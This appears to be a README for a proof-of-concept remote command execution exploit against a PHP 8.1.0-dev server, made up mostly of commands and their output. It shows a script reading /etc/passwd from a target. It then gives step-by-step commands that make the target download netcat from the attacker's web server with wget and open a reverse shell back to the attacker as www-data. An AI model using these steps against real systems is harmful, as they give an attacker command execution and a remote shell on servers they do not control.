# PHP-8.1.0-dev-poc
Remote Command Execution
## Usage
```bash
$ python2 cmd.py
Usage: cmd.py http://example.com whoami

python2 cmd.py http://192.168.0.22 'cat /etc/passwd'system("cat /etc/passwd") was sent successfully, response:
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologin[snip]opscode-pgsql:x:996:996::/var/opt/opscode/postgresql:/bin/shstring(60) "opscode-pgsql:x:996:996::/var/opt/opscode/postgresql:/bin/sh
```
## Reverse Shell 
In order to get a reverse shell you will need a netcat binary that allows the -e option. 
Copy /usr/bin/nc to the current directory and start up a web server: 
```bash
$ cp -r /usr/bin/nc .
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

python2 cmd.py http://192.168.0.22 'wget http://192.168.0.2/nc -O /tmp/nc; chmod +x /tmp/nc; ls /tmp/nc'
system("wget http://192.168.0.2/nc -O /tmp/nc; chmod +x /tmp/nc; ls /tmp/nc") was sent successfully, response:
/tmp/nc
string(7) "/tmp/nc
```
# The Web Server: 
```bash
192.168.0.22 - - [21/May/2021 07:42:07] "GET /nc HTTP/1.1" 200
```
# Execution 
```bash
python2 cmd.py http://192.168.0.22 '/tmp/nc -e /bin/bash 192.168.0.2 1000'

nc -lvp 1000
listening on [any] 1000 ...
connect to [192.168.0.2] from localhost [192.168.0.22] 
whoami
www-data```
